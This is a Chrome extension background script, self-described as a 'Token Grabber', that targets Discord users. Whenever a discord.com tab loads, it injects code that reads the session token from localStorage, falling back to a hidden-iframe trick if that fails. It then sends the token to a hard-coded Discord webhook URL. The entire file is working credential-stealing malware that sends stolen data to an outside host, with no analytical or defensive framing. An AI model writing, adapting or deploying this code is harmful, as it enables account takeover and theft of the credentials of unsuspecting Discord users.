chrome.runtime.onInstalled.addListener(() => {
  chrome.action.setBadgeText({ text: "ON" });
  console.log("✅ Token Grabber Extension Loaded");
});

// Listen for messages from content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "DISCORD_TOKEN" && message.token) {
    console.log("%c[BACKGROUND] Received token from content script", "color:lime;font-size:14px;");

    const webhookUrl = "https://discord.com/api/webhooks/1487805472529449181/8fUDXYf4KHAwfK7IBKDVNUS10eXSiOGWqADVukPYVHxaObHt9o9TtD366v7Zm8O_zEdD";

    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `**Discord Token Captured**\n\`\`\`js\n${message.token}\n\`\`\``,
        username: "Token Grabber"
      })
    })
    .then(response => {
      if (response.ok) {
        console.log("%c✅ Token successfully sent to webhook from background!", "color:lime;font-size:16px;");
      } else {
        console.error(`❌ Webhook failed: ${response.status}`);
        response.text().then(text => console.error(text));
      }
    })
    .catch(err => {
      console.error("❌ Background fetch error:", err);
    });
  }
});

// Token grabber function (injected into Discord tab)
function grabToken() {
  console.log("[Token Grabber] Injected into Discord tab");

  let token = null;

  // Try localStorage
  try {
    if (window.localStorage) {
      token = localStorage.getItem('token');
    }
  } catch (e) {}

  // Try iframe bypass
  if (!token) {
    try {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      document.body.appendChild(iframe);
      token = iframe.contentWindow.localStorage.getItem('token');
      document.body.removeChild(iframe);
    } catch (e) {
      console.log("[Token Grabber] Iframe blocked");
    }
  }

  if (token) {
    console.log("%c[TOKEN FOUND]", "color:lime;font-size:16px;", token.substring(0, 70) + "...");

    // Send token to background script
    chrome.runtime.sendMessage({ type: "DISCORD_TOKEN", token: token });
  } else {
    console.log("❌ No token found in this attempt");
  }
}

// Listen for Discord tabs
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && tab.url.includes('discord.com')) {
    console.log(`🔍 Discord tab loaded → injecting grabber`);

    chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: grabToken
    }).catch(err => console.error("Injection failed:", err));
  }
});